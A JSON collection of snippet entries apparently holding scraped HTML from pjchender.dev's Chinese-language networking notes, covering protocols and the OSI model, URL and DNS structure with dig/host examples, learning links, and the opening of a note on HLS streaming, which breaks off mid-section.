{
  "hinternet [網際網路] 網路基礎知識 pjchender.dev": {
    "prefix": "hinternet [網際網路] 網路基礎知識 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] 網路基礎知識</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"什麼是通訊協定protocol\">什麼是通訊協定（Protocol）<a href=\"#什麼是通訊協定protocol\" class=\"hash-link\" aria-label=\"什麼是通訊協定（Protocol）的直接連結\" title=\"什麼是通訊協定（Protocol）的直接連結\">​</a></h2><p><code>通訊協定（protocol）</code>是用來定義電腦間通訊時所應遵循的規範，就像一群人在討論時，要先規定彼此使用的語言後才能進行溝通一樣。通訊協定包含了<code>資料格式</code>和<code>通訊程序</code>這兩個部分。</p><p><code>資料格式</code>指的就是要用何種格式來傳送資料；<code>通訊程序</code>用來訂定處理的順序和內容。</p><p>幾乎沒有一個通訊協定就可以有能力定義所有的通訊作業，<strong>通常在定義一個完整的通訊程序時，會需要多個通訊協定互相搭配運用</strong>，而能夠互相搭配運用的通訊協定組合就稱作「<code>通訊協定家族（Protocol Suite）</code>」。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"網路架構network-architecture\">網路架構（Network Architecture）<a href=\"#網路架構network-architecture\" class=\"hash-link\" aria-label=\"網路架構（Network Architecture）的直接連結\" title=\"網路架構（Network Architecture）的直接連結\">​</a></h2><p>藉由一定的概念或架構來建立網路的做法，就稱作<code>網路架構（Network Architecture）</code>，例如 OSI 模型、TCP/IP 模型。</p><blockquote><p>若依照每一層的處理程序分別加以彙整為套組的作法被稱為「<code>協定堆疊（Protocol Stack）</code>」，例如，<code>TCP/IP 協定堆疊</code>。</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"層layer\">層（Layer）<a href=\"#層layer\" class=\"hash-link\" aria-label=\"層（Layer）的直接連結\" title=\"層（Layer）的直接連結\">​</a></h3><p>通訊協定通常是透過<code>階層（Layer）</code>的概念加以定義，其中「共通功能」或「簡易」的協定會被放在下層，較偏向「個別功能」或「複雜」的則放在上層，<strong>下層的概念可供上層使用</strong>。</p><p>透過階層式的結構，只要設定好每個階層的邊界，就能讓通訊協定的定位更加明確，重組時也更輕鬆。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"osi-參考模型\">OSI 參考模型<a href=\"#osi-參考模型\" class=\"hash-link\" aria-label=\"OSI 參考模型的直接連結\" title=\"OSI 參考模型的直接連結\">​</a></h3><p><code>OSI（Open System Interconnection，開放式系統互連）參考模型</code>將電腦所需的功能歸納整理為 7 大階層，<strong>下層負責提供抽象化功能以供上層使用</strong>。它能夠有效的將通訊所需的功能條理化、系統化，其中由低往高分別是：<code>實體層（Physical Layer）</code>、<code>資料連結層（Data Link Layer）</code>、<code>網路層（Network Layer）</code>、<code>傳輸層（Transport Layer）</code>、<code>會議層（Session Layer）</code>、<code>表現層（Presentation Layer）</code>、<code>應用層（Application Layer）</code>。</p><blockquote><p>通常會使用<code>第 O 層</code>或 <code>LO</code> 來表示，而不會使用其英文名稱。</p></blockquote><blockquote><p>參考：<a href=\"https://zh.wikipedia.org/wiki/OSI模型\" target=\"_blank\" rel=\"noopener noreferrer\">OSI 模型</a> @ Wiki</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tcpip-階層模型\">TCP/IP 階層模型<a href=\"#tcpip-階層模型\" class=\"hash-link\" aria-label=\"TCP/IP 階層模型的直接連結\" title=\"TCP/IP 階層模型的直接連結\">​</a></h3><blockquote><p>參考：<a href=\"https://zh.wikipedia.org/wiki/TCP/IP协议族\" target=\"_blank\" rel=\"noopener noreferrer\">TCP/IP 協定套組</a> @ Wiki</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"互聯網的建立\">互聯網的建立<a href=\"#互聯網的建立\" class=\"hash-link\" aria-label=\"互聯網的建立的直接連結\" title=\"互聯網的建立的直接連結\">​</a></h2><p>每個網路各有不同的網路位址，傳送資料時必須根據「網路位址」這個線索，並利用「路由」功能，才能將資料傳送到目的端網路。連接到網路上的每台電腦都會被配置一個「IP 位址」的專屬識別資訊。</p><p>電信業者所架設的光纖纜線一般會透過一個稱為 <code>ONU（光纖寬頻數據機）</code>的裝置連接到辦公室、家用路由器或其他網路裝置。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/1258\" target=\"_blank\" rel=\"noopener noreferrer\">鯊魚咬電纜：30 天玩 Wireshark</a> @ IThome</li><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] 認識網址與網域名稱（Domain Name, URL, DNS） pjchender.dev": {
    "prefix": "hinternet [網際網路] 認識網址與網域名稱（Domain Name, URL, DNS） pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] 認識網址與網域名稱（Domain Name, URL, DNS）</h1></header><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-domain-subdomain-icann-tld-dns-url\">keywords: <code>domain</code>, <code>subdomain</code>, <code>ICANN</code>, <code>TLD</code>, <code>DNS</code>, <code>URL</code><a href=\"#keywords-domain-subdomain-icann-tld-dns-url\" class=\"hash-link\" aria-label=\"keywords-domain-subdomain-icann-tld-dns-url的直接連結\" title=\"keywords-domain-subdomain-icann-tld-dns-url的直接連結\">​</a></h5><blockquote><p>非原創文章，內容擷取自：</p><ul><li><a href=\"http://www.ruanyifeng.com/blog/2018/05/root-domain.html\" target=\"_blank\" rel=\"noopener noreferrer\">根域名的知識</a> @ 阮一峰的網路日誌</li><li><a href=\"http://www.ruanyifeng.com/blog/2016/06/dns.html\" target=\"_blank\" rel=\"noopener noreferrer\">DNS 原理入門</a> @ 阮一峰的網路日誌</li><li><a href=\"https://blog.gtwang.org/web-development/url-lower-and-upper-case/\" target=\"_blank\" rel=\"noopener noreferrer\">網址 URL 英文大小寫是否有差別？</a></li></ul></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"認識網址\">認識網址<a href=\"#認識網址\" class=\"hash-link\" aria-label=\"認識網址的直接連結\" title=\"認識網址的直接連結\">​</a></h2><p><img loading=\"lazy\" src=\"../../../i.imgur.com/z5BUSbA.jpg\" alt=\"Imgur\" class=\"img_ev3q\"></p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 主機名.次級網域名稱.頂級網域名稱.根網域名稱</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># host.sld.tld.root</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">www.google.com.root</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>一般的網址長這樣：<code>http://www.youtube.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument</code></p><ul><li><strong>通訊協定（protocol）</strong>：又稱為 <code>scheme</code>，一般最常見的是 <code>http</code> 或 <code>https</code> ，其他還有 <code>ftp</code> 等等。這個部分根據 <a href=\"https://tools.ietf.org/html/rfc3986#section-3.1\" target=\"_blank\" rel=\"noopener noreferrer\">RFC</a> 可以<strong>不分大小寫</strong>，但正式的情況下還是會使用小寫。</li><li><strong>第三層網域名稱</strong>：上述 <code>www</code> 這個部分，又稱<strong>子網域（subdomain）</strong>或<strong>主機名（host）</strong>。</li><li><strong>第二層網域名稱（Second Level Domain, SLD）</strong>：上述 <code>youtube</code> 的部分，又稱為<strong>網域名稱</strong>。</li><li><strong>頂級網域（Top Level Domain, TLD）</strong>：上述 <code>.com</code> 的部分，就是最高層級的網域。簡單說，就是網址的最後一個部分。</li><li><strong>連接埠（port）</strong>：預設是 80，所以可以不用填。</li><li><strong>網頁路徑（Path）</strong>：上述 <code>/path/to/myfile.html</code> 的部分，這個部分根據伺服器的作業系統有所不同，引此<strong>建議不要更改大小寫</strong>。</li><li><strong>參數（parameters）</strong>：上述 <code>?key1=value&amp;key2=value2</code> 的部分，用來傳訊息給伺服器，<strong>大小寫不能任意更改</strong>。</li><li><strong>錨點（anchor）</strong>：上述 <code>#SomewhereInTheDocument</code> 的部分，可以對應到網頁 HTML 中的 <code>id</code> 或 <code>name</code>，<strong>大小寫不能更改</strong>。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"認識網域名稱domain-name\">認識網域名稱（Domain Name）<a href=\"#認識網域名稱domain-name\" class=\"hash-link\" aria-label=\"認識網域名稱（Domain Name）的直接連結\" title=\"認識網域名稱（Domain Name）的直接連結\">​</a></h2><p>對人類來說要記住一長串的 IP 位址非常不容易，因此創造了「<strong>網域名稱（Domain Name）</strong>」做為電腦在網路上的名字，而這個網域名稱在全世界是獨一無二的。</p><p>網域名稱由 ICANN（Internet Corporation for Assigned Names and Numbers）作為全世界網域的最高管理機構，由 ICANN 負責管理頂級網域名稱（Top Level Domain, TLD）。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"根網域名稱\">根網域名稱<a href=\"#根網域名稱\" class=\"hash-link\" aria-label=\"根網域名稱的直接連結\" title=\"根網域名稱的直接連結\">​</a></h3><p>我們有時會看到網址的最後面多一個 <code>.</code>，例如 <code>www.example.com.</code>，這個 <code>.</code> 不是多打的，而是<strong>所有網域名稱的尾部實際上都有一個根網域名稱</strong>，也就是說，前面例子真正的網域名稱是 <code>www.example.com.root</code>，簡寫成 <code>www.example.com.</code></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"頂級網域名稱top-level-domain-tld\">頂級網域名稱（Top Level Domain, TLD）<a href=\"#頂級網域名稱top-level-domain-tld\" class=\"hash-link\" aria-label=\"頂級網域名稱（Top Level Domain, TLD）的直接連結\" title=\"頂級網域名稱（Top Level Domain, TLD）的直接連結\">​</a></h3><p>所謂頂級網域（TLD），就是最高層級的網域。<strong>簡單說，就是網址的最後一個部分</strong>。比如，網址 <code>www.example.com</code> 的頂級域名就是 <code>.com</code>。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"頂級網域的分類\">頂級網域的分類<a href=\"#頂級網域的分類\" class=\"hash-link\" aria-label=\"頂級網域的分類的直接連結\" title=\"頂級網域的分類的直接連結\">​</a></h4><p>它們可以分成兩類：</p><ul><li><strong>一般性頂級網域（general TLD, gTLD）</strong>：比如 <code>.com</code>、<code>.net</code>、<code>.edu</code>、<code>.org</code>、<code>.xxx</code> 等等，共有 700 多個。</li><li><strong>國別頂級網域（country-code TLD, ccTLD</strong>）：代表不同的國家和地區，比如<code>.cn</code>（中國）、<code>.io</code>（英屬印度洋領地）、<code>.cc</code>（科科斯群島）、<code>.tv</code>（圖瓦盧）等，共有 300 多個。</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"頂級網域的管理\">頂級網域的管理<a href=\"#頂級網域的管理\" class=\"hash-link\" aria-label=\"頂級網域的管理的直接連結\" title=\"頂級網域的管理的直接連結\">​</a></h4><p>ICANN 的政策是，每個頂級網域都找一個託管商（domain host），又稱註冊<strong>管理機構（Registry）</strong>，該網域的所有事項都由託管商負責，ICANN 只與託管商聯繫。舉例來說，台灣的 <code>.tw</code> 是由台灣網路資訊中心（TWNIC）所管理；<code>.com</code> 和 <code>.net</code> 則是由美國的 Verisign 負責。</p><blockquote><p>若要查詢網域代管商可以透過 ICANN 提供的 <a href=\"https://whois.icann.org/en/lookup?name=\" target=\"_blank\" rel=\"noopener noreferrer\">WHOIS LOOKUP</a> 查詢（但有時會查不到），所以比較多人到 <a href=\"https://www.whois365.com/tw\" target=\"_blank\" rel=\"noopener noreferrer\">whois365</a> 或在 terminal 中透過 <code>whois</code> 指令查詢。其中的 <strong>Registrar</strong> 欄位通常就是託管商。</p></blockquote><p><img loading=\"lazy\" src=\"../../../i.imgur.com/lJKUB5bc4ca.jpg?1\" alt=\"Imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"dnsdomain-name-service\">DNS（Domain Name Service）<a href=\"#dnsdomain-name-service\" class=\"hash-link\" aria-label=\"DNS（Domain Name Service）的直接連結\" title=\"DNS（Domain Name Service）的直接連結\">​</a></h2><p><strong>DNS（Domain Name Service，網域名稱系統）</strong>可以做<strong>「名稱解析（Name Resolution ）」</strong>的服務，也就是可以透過 IP 位址查詢網域名稱（反向解析），或透過網域名稱查詢 IP 位址（正向解析）。DNS 伺服器會透過 TCP 的 Port 53 進行「區域傳送（Zone transfer）」以進行資料複製的作業。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"對於使用者而言\">對於使用者而言<a href=\"#對於使用者而言\" class=\"hash-link\" aria-label=\"對於使用者而言的直接連結\" title=\"對於使用者而言的直接連結\">​</a></h3><p>使用者的電腦一定需要知道 DNS 伺服器的 IP，如此才能再進一步查詢其他網址的 IP 為何，如此才能上網。而這個伺服器的 IP 可以是固定的，也可以由上網時的閘道器動態分配（DHCP 機制）。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"瞭解本機-dns-伺服器-ip-設定\">瞭解本機 DNS 伺服器 IP 設定<a href=\"#瞭解本機-dns-伺服器-ip-設定\" class=\"hash-link\" aria-label=\"瞭解本機 DNS 伺服器 IP 設定的直接連結\" title=\"瞭解本機 DNS 伺服器 IP 設定的直接連結\">​</a></h4><p>一般常見的公用 DNS 伺服器如 Google 的 <code>8.8.8.8</code>；中華電信的 <code>168.95.192.1</code>, <code>168.95.1.1</code>。</p><p>若想檢視 MAC 上設定的 DNS 伺服器 IP ，可以透過以下指令查詢：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ scutil --dns</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p>一般 Linux 系統中，DNS 伺服器的 IP 地址保存在 <code>/etc/resolv.conf</code> 檔案。</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"瞭解-dns-解析過程dig\">瞭解 DNS 解析過程：dig<a href=\"#瞭解-dns-解析過程dig\" class=\"hash-link\" aria-label=\"瞭解 DNS 解析過程：dig的直接連結\" title=\"瞭解 DNS 解析過程：dig的直接連結\">​</a></h4><p>DNS 是透過分級查詢的方式：</p><ul><li>先從「根網域名稱伺服器」查到「頂級網域名稱伺服器」的 NS 記錄和 A 記錄（IP 位址）。</li><li>從「頂級網域名稱伺服器」查到「次級網域名稱伺服器」的 NS 記錄和 A 記錄（IP 位址）。</li><li>從「次級網域名稱伺服器」查到「主機名」的 IP 地址。</li></ul><p>使用終端機內建的 <code>dig</code> 工具即可瞭解整個 DNS 查詢過程：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ dig www.google.com</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ dig +short www.google.com        # 如果不想看這麼詳細的資訊</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ dig +trace math.stackexchange.com    # 檢視整個查詢流程</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ dig -x</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>其他工具如 <code>host</code> 可以獲得更簡潔的資訊：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ host www.google.com        # 可查詢該網域 IP 位址</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ host 192.30.253.112        # 可用於 IP 反查網域名稱</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>其他可用的還有 <code>whois</code> 和 <code>nslookup</code> 等工具指令。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"對於-dns-伺服器而言\">對於 DNS 伺服器而言<a href=\"#對於-dns-伺服器而言\" class=\"hash-link\" aria-label=\"對於 DNS 伺服器而言的直接連結\" title=\"對於 DNS 伺服器而言的直接連結\">​</a></h3><p>DNS 系統由內容伺服器和快取伺服器（Full service reserver）組成。當電腦或伺服器提出名稱解析的要求後，電腦或伺服器會透過內建的 <strong>Stub resolver（解析器）</strong> 將名稱解析的請求傳送給<strong>快取伺服器</strong>，若在快取伺服器中找不到資料，則會向<strong>內容伺服器</strong>請求名稱解析，解析完的結果在送回快取伺服器，在回傳給電腦。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/UNPunph.jpg\" class=\"img_ev3q\"></p><p>為了解決 DNS 可能的追蹤、欺騙和竄改，在 Mozilla 中引入了兩項新功能來解決這個問題-<strong>可信遞回解析器（TRR ，Trusted Recursive Resolver）</strong>和基於 <strong>HTTPS 的 DNS（DoH，DNS over HTTPS）</strong>。</p><blockquote><ul><li><a href=\"http://www.ruanyifeng.com/blog/2016/06/dns.html\" target=\"_blank\" rel=\"noopener noreferrer\">DNS 原理入門</a> @ 阮一峰的網路日誌</li><li>DNS 解析的過程與安全性可參考：<a href=\"https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/\" target=\"_blank\" rel=\"noopener noreferrer\">A cartoon intro to DNS over HTTPS</a> @ Mozilla Hacks</li></ul></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"dns-的記錄類型\">DNS 的記錄類型<a href=\"#dns-的記錄類型\" class=\"hash-link\" aria-label=\"DNS 的記錄類型的直接連結\" title=\"DNS 的記錄類型的直接連結\">​</a></h3><p>網域名稱與 IP 之間對應的關係稱為<strong>記錄（record）</strong>，常見的記錄如下：</p><ul><li><strong>A</strong>：地址記錄（address），回傳網域名稱所對應的 <strong>IP 位址</strong>。若一個網域名稱對應到多個 A 記錄，表示這些 IP 位址都可以連到該主機。</li><li><strong>NS</strong>：網域名稱伺服器（Name Server），回傳保存下一級網域名稱信息的伺服器地址。只能設定網域名稱，不能設定 IP 位址。</li><li><strong>MX</strong>：郵件記錄（Mail eXchange），回傳接受電子郵件的伺服器位址。</li><li><strong>CNAME</strong>：正準名稱記錄（Canonical Name），回傳另一個網域名稱，用於網域名稱的<strong>內部跳轉</strong>，用戶並不會覺察。為了避免衝突，一旦設定 CNAME 之後就不能設定 A 記錄和 MX 記錄。</li><li><strong>PTR</strong>：指標記錄（Pointer Record），透過 IP 地址查詢網域名稱。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"http://www.ruanyifeng.com/blog/2018/05/root-domain.html\" target=\"_blank\" rel=\"noopener noreferrer\">根域名的知識</a> @ 阮一峰的網路日誌</li><li><a href=\"http://www.ruanyifeng.com/blog/2016/06/dns.html\" target=\"_blank\" rel=\"noopener noreferrer\">DNS 原理入門</a> @ 阮一峰的網路日誌</li><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li><li><a href=\"https://www.sistrix.com/ask-sistrix/onpage-optimisation/what-is-the-difference-between-a-url-domain-subdomain-hostname-etc/\" target=\"_blank\" rel=\"noopener noreferrer\">What is the difference between a URL, Domain, Subdomain, Hostname etc.?</a> @ sistrix</li><li><a href=\"https://www.sistrix.com/ask-sistrix/onpage-optimisation/top-level-domain-tld/\" target=\"_blank\" rel=\"noopener noreferrer\">Top Level Domain</a> @ sistrix</li><li><a href=\"https://blog.gtwang.org/web-development/url-lower-and-upper-case/\" target=\"_blank\" rel=\"noopener noreferrer\">網址 URL 英文大小寫是否有差別？</a></li><li><a href=\"https://support.google.com/a/answer/48323?hl=en\" target=\"_blank\" rel=\"noopener noreferrer\">Identify your domain host</a> @ Google Support</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] 學習資源 Learning Resource pjchender.dev": {
    "prefix": "hinternet [網際網路] 學習資源 Learning Resource pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] 學習資源 Learning Resource</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"todo\">TODO<a href=\"#todo\" class=\"hash-link\" aria-label=\"TODO的直接連結\" title=\"TODO的直接連結\">​</a></h2><ul class=\"contains-task-list containsTaskList_mC6p\"><li class=\"task-list-item\"><p><input type=\"checkbox\" disabled=\"\"> <a href=\"http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html\" target=\"_blank\" rel=\"noopener noreferrer\">互聯網協議入門（一）</a> @ 阮一峰的網絡日誌</p></li><li class=\"task-list-item\"><p><input type=\"checkbox\" disabled=\"\"> <a href=\"http://www.ruanyifeng.com/blog/2012/06/internet_protocol_suite_part_ii.html\" target=\"_blank\" rel=\"noopener noreferrer\">互聯網協議入門（二）</a> @ 阮一峰的網絡日誌</p></li><li class=\"task-list-item\"><p><input type=\"checkbox\" disabled=\"\"> <a href=\"http://www.ruanyifeng.com/blog/2017/06/tcp-protocol.html\" target=\"_blank\" rel=\"noopener noreferrer\">TCP 協議</a> @ 阮一峰的網絡日誌</p></li><li class=\"task-list-item\"><p><input type=\"checkbox\" disabled=\"\"> <a href=\"http://www.ruanyifeng.com/blog/2017/06/smtp-protocol.html\" target=\"_blank\" rel=\"noopener noreferrer\">如何驗證 Email 地址：SMTP 協議入門教程</a> @ 阮一峰的網絡日誌</p></li><li class=\"task-list-item\"><p><input type=\"checkbox\" disabled=\"\"> <a href=\"http://www.ruanyifeng.com/blog/2016/06/dns.html\" target=\"_blank\" rel=\"noopener noreferrer\">DNS 原理入門</a> @ 阮一峰的網絡日誌</p></li><li class=\"task-list-item\"><p><input type=\"checkbox\" disabled=\"\"> <a href=\"https://zhuanlan.zhihu.com/p/47407398\" target=\"_blank\" rel=\"noopener noreferrer\">圖解瀏覽器的基本工作原理</a> @ 知乎</p></li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] HTTP Media Live Streaming, HLS pjchender.dev": {
    "prefix": "hinternet [網際網路] HTTP Media Live Streaming, HLS pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] HTTP Media Live Streaming, HLS</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"live-streamed-和-static-media-的差別\">Live Streamed 和 Static media 的差別<a href=\"#live-streamed-和-static-media-的差別\" class=\"hash-link\" aria-label=\"Live Streamed 和 Static media 的差別的直接連結\" title=\"Live Streamed 和 Static media 的差別的直接連結\">​</a></h2><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-progressive-download-adaptive-streaming\">keywords: <code>progressive download</code>, <code>adaptive streaming</code><a href=\"#keywords-progressive-download-adaptive-streaming\" class=\"hash-link\" aria-label=\"keywords-progressive-download-adaptive-streaming的直接連結\" title=\"keywords-progressive-download-adaptive-streaming的直接連結\">​</a></h5><p>通常我們將已有實體檔案的媒體檔稱作<strong>靜態媒體（static media）</strong>，不論它是 <code>mp3</code> 或 <code>webm</code>，這些檔案通常存在伺服器上，並且就像其他靜態檔案一樣，可以傳送到瀏覽器，通常把這種稱作<strong>漸進式下載（progressive download）</strong>。</p><p>相較於靜態檔案，<strong>即時串流媒體（Live streamed media）</strong>通常沒有確切的開始和結束時間，它是透過伺服器傳送串流資料到瀏覽器，通常是<strong>自適性（adaptive）</strong>，通常會需要不同的檔案格式和特別的伺服器軟體來達到。</p><p>其中<strong>即時串流（live streaming）</strong>很重要的是要讓播放器和串流保持同步，而<strong>自適性串流（adaptive streaming）</strong>就是一種可以達到並降低流量的技術。它的概念是去監控資料傳輸的比例，如果它沒有持續，那麼就降低頻寬（bandwidth），也就是降低串流媒體的品質。為了達到這樣的效果，我們需要使用特定的檔案格式，而即時串流的檔案格式通常都可以透過將串流切割成許多小片段，並且將這些片段以不同的品質或位元速率（bit rate）來使用。</p><blockquote><p>串流的技術並不只能用在即時串流上，過去傳統的漸進式下載也可以使用。</p></blockquote><ul><li>Live Streaming：即時串流，Live 是關鍵字，因此要是直播串流</li><li>VoD（Voice on Demand）：已經有固定的影片檔，透過串流的方式傳給 Client</li><li>OTT（Over the Top）</li><li>ABS（自適性串流）：根據使用者的頻寬和 CPU 使用率自動調整影片串流的品質。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"streaming-protocols\">Streaming Protocols<a href=\"#streaming-protocols\" class=\"hash-link\" aria-label=\"Streaming Protocols的直接連結\" title=\"Streaming Protocols的直接連結\">​</a></h2><ul><li><strong>HTTP</strong></li><li><strong>RTMP（Real Time Messaging Protocol）</strong>：由 Adobe 發展，相關的包含 <code>RTMPE</code>, <code>RTMPS</code>, <code>RTMPT</code></li><li><strong>RTSP (Real Time Streaming Protocol)</strong>：通常會搭配 <strong>RTP (Real-time Transport Protocol)</strong> 和 <strong>RTCP (Real-time Control Protocol)</strong> 一起用來傳輸媒體串流，<strong>多數瀏覽器仍不支援</strong>。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"media-source-extensions-mse\">Media 